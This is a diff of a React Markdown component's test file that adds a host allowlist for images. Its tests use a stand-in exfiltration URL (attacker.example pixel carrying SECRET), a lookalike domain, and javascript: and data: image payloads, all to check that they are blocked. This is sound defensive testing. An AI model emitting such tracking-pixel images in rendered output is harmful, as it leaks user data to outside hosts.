@@ -1,6 +1,6 @@
 import { cleanup, render, screen } from '@testing-library/react';
 import { describe, expect, it, vi } from 'vitest';
-import { Markdown } from '../src/markdown';
+import { Markdown, type MarkdownProps } from '../src/markdown';
 import { axe } from './utils';
 
 describe('Markdown', () => {
@@ -53,11 +53,15 @@ describe('Markdown', () => {
 
   describe('streaming caret', () => {
     /** Render while capturing React's console errors (invalid DOM nesting, void-element children). */
-    function renderStreaming(text: string) {
+    function renderStreaming(text: string, props: Partial<MarkdownProps> = {}) {
       const errors: string[] = [];
       const spy = vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.map(String).join(' ')));
       try {
-        const { container } = render(<Markdown streaming>{text}</Markdown>);
+        const { container } = render(
+          <Markdown streaming {...props}>
+            {text}
+          </Markdown>,
+        );
         return { container, errors };
       } finally {
         spy.mockRestore();
@@ -77,7 +81,9 @@ describe('Markdown', () => {
     });
 
     it('keeps the caret out of a trailing image', () => {
-      const { container, errors } = renderStreaming('See ![x](/chart.png)');
+      const { container, errors } = renderStreaming('See ![x](https://img.test/chart.png)', {
+        allowedImageHosts: ['img.test'],
+      });
       expect(errors).toEqual([]);
       const img = container.querySelector('img')!;
       expect(img.childNodes).toHaveLength(0);
@@ -89,21 +95,83 @@ describe('Markdown', () => {
         '# Plan\n\nRead **the route** and `lib/redis.ts`, then [docs](https://ai-sdk.dev).\n\n',
         '- [x] search\n- [ ] read\n\n1. one\n2. two\n\n',
         '> quoted *text*\n\n---\n\n',
-        'a break  \nnext line\n\n',
+        '![chart](https://img.test/c.png) and a break  \nnext line\n\n',
         '| a | b |\n|---|---|\n| 1 | 2 |\n\n',
         '```ts\nconst x = 1;\n```\n\n***\n',
       ].join('');
-      for (let end = 1; end <= doc.length; end++) {
-        const { errors } = renderStreaming(doc.slice(0, end));
-        expect({ prefix: doc.slice(0, end), errors }).toEqual({ prefix: doc.slice(0, end), errors: [] });
-        cleanup();
+      for (const allowedImageHosts of [undefined, ['img.test']]) {
+        for (let end = 1; end <= doc.length; end++) {
+          const { errors } = renderStreaming(doc.slice(0, end), { allowedImageHosts });
+          expect({ prefix: doc.slice(0, end), errors }).toEqual({ prefix: doc.slice(0, end), errors: [] });
+          cleanup();
+        }
       }
+    });
+  });
+
+  describe('images', () => {
+    const pixel = 'https://attacker.example/pixel.png?d=SECRET';
+
+    it('does not load remote images by default, and links to them instead', () => {
+      const { container } = render(<Markdown>{`Summary ![status](${pixel}) done.`}</Markdown>);
+      expect(container.querySelector('img')).toBeNull();
+      const link = screen.getByRole('link', { name: /status/ });
+      expect(link).toHaveAttribute('href', pixel);
+      expect(link).toHaveAttribute('rel', 'noopener noreferrer');
+    });
+
+    it('loads images only from allowed hosts', () => {
+      const { container } = render(
+        <Markdown allowedImageHosts={['Images.Example.com', 'localhost:3000']}>
+          {[
+            '![ok](https://images.example.com/a.png)',
+            `![pixel](${pixel})`,
+            '![lookalike](https://images.example.com.attacker.example/a.png)',
+            '![relative](/a.png)',
+            '![protocol-relative](//attacker.example/a.png)',
+            '![port](http://localhost:3000/a.png)',
+          ].join('\n\n')}
+        </Markdown>,
+      );
+      expect([...container.querySelectorAll('img')].map((img) => img.getAttribute('src'))).toEqual([
+        'https://images.example.com/a.png',
+        'http://localhost:3000/a.png',
+      ]);
+      expect(screen.getByRole('img', { name: 'ok' })).toBeInTheDocument();
+      expect(screen.getAllByRole('link')).toHaveLength(4);
+    });
+
+    it("loads every image with '*'", () => {
+      const { container } = render(<Markdown allowedImageHosts={['*']}>{`![a](${pixel}) ![b](/b.png)`}</Markdown>);
+      expect(container.querySelectorAll('img')).toHaveLength(2);
+    });
+
+    it('renders the alt text for images without a usable URL, including half-streamed ones', () => {
+      const errors = vi.spyOn(console, 'error').mockImplementation(() => {});
+      const { container, rerender } = render(
+        <Markdown allowedImageHosts={['*']}>{'![x](javascript:alert(1)) ![y](data:image/png;base64,AAAA)'}</Markdown>,
+      );
+      expect(container.querySelector('img')).toBeNull();
+      expect(container).toHaveTextContent('x y');
+      rerender(
+        <Markdown streaming allowedImageHosts={['*']}>
+          {'Here: ![chart](https://img.te'}
+        </Markdown>,
+      );
+      expect(container.querySelector('img')).toBeNull();
+      expect(container).toHaveTextContent('Here: chart');
+      expect(errors).not.toHaveBeenCalled();
+      errors.mockRestore();
     });
   });
 
   it('has no axe violations', async () => {
     const { container } = render(
-      <Markdown citations={1}>{'# Title\n\nText [1] with [a link](https://x.dev).\n\n```sh\npnpm i\n```'}</Markdown>,
+      <Markdown citations={1} allowedImageHosts={['img.test']}>
+        {
+          '# Title\n\nText [1] with [a link](https://x.dev).\n\n```sh\npnpm i\n```\n\n![chart](https://img.test/c.png) ![pixel](https://x.dev/p.png)'
+        }
+      </Markdown>,
     );
     expect(await axe(container)).toHaveNoViolations();
   });
